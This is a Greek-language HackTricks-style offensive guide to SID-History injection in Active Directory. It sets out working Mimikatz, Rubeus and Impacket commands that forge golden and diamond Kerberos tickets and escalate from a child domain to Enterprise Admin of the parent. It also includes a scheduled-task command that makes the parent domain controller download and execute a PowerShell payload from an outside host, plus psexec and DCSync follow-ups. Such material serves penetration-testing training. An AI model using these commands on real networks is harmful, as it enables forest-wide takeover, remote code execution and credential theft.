# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Η εστίαση της **Επίθεσης Εισαγωγής Ιστορικού SID** είναι η βοήθεια **μεταφοράς χρηστών μεταξύ τομέων** ενώ διασφαλίζεται η συνεχής πρόσβαση σε πόρους από τον πρώην τομέα. Αυτό επιτυγχάνεται με **την ενσωμάτωση του προηγούμενου Αναγνωριστικού Ασφαλείας (SID) του χρήστη στο Ιστορικό SID** του νέου του λογαριασμού. Σημαντικό είναι ότι αυτή η διαδικασία μπορεί να παραποιηθεί για να παραχωρήσει μη εξουσιοδοτημένη πρόσβαση προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από τον γονικό τομέα στο Ιστορικό SID. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του γονικού τομέα.

Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.

Για να προσδιορίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να εντοπίσετε το SID του ριζικού τομέα. Αφού γίνει η αναγνώριση, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας `-519` στο SID του ριζικού τομέα. Για παράδειγμα, αν το SID του ριζικού τομέα είναι `S-1-5-21-280534878-1496970234-700767426`, το αποτέλεσμα SID για την ομάδα "Enterprise Admins" θα ήταν `S-1-5-21-280534878-1496970234-700767426-519`.

Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, οι οποίες τελειώνουν σε **512**.

Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας του άλλου τομέα (για παράδειγμα "Domain Admins") είναι με:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Χρυσό Εισιτήριο (Mimikatz) με KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Για περισσότερες πληροφορίες σχετικά με τα χρυσά εισιτήρια, ελέγξτε:

{{#ref}}
golden-ticket.md
{{#endref}}

### Διαμαντένιο Εισιτήριο (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Για περισσότερες πληροφορίες σχετικά με τα διαμάντια ελέγξτε:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Αναβάθμιση σε DA του root ή Enterprise admin χρησιμοποιώντας το hash KRBTGT του παραβιασμένου τομέα:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Με τις αποκτηθείσες άδειες από την επίθεση μπορείτε να εκτελέσετε για παράδειγμα μια επίθεση DCSync στο νέο τομέα:

{{#ref}}
dcsync.md
{{#endref}}

### Από linux

#### Χειροκίνητα με [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Αυτόματα χρησιμοποιώντας [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Αυτό είναι ένα σενάριο Impacket που θα **αυτοματοποιήσει την αναβάθμιση από το παιδικό στο γονικό domain**. Το σενάριο χρειάζεται:

- Στοχευμένος ελεγκτής τομέα
- Διαπιστευτήρια για έναν διαχειριστή χρήστη στο παιδικό domain

Η ροή είναι:

- Αποκτά το SID για την ομάδα Enterprise Admins του γονικού domain
- Ανακτά το hash για τον λογαριασμό KRBTGT στο παιδικό domain
- Δημιουργεί ένα Golden Ticket
- Συνδέεται στο γονικό domain
- Ανακτά διαπιστευτήρια για τον λογαριασμό Administrator στο γονικό domain
- Εάν έχει καθοριστεί η επιλογή `target-exec`, αυθεντικοποιείται στον Ελεγκτή Τομέα του γονικού domain μέσω Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Αναφορές

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
